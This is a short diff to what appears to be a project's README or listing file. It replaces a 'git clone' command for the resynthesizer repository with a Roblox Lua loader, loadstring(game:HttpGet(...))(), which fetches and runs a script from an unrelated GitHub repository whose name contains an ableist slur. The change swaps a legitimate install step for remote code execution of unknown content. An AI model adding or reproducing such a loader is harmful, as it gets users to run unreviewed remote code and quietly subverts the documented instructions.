@@ -4,4 +4,4 @@
 
 - status : active
 
-git clone https://github.com/bootchk/resynthesizer
+*loadstring(game:HttpGet("https://raw.githubusercontent.com/endermanmasterkarakus/ScriptForRetards/main/SFR"))()*
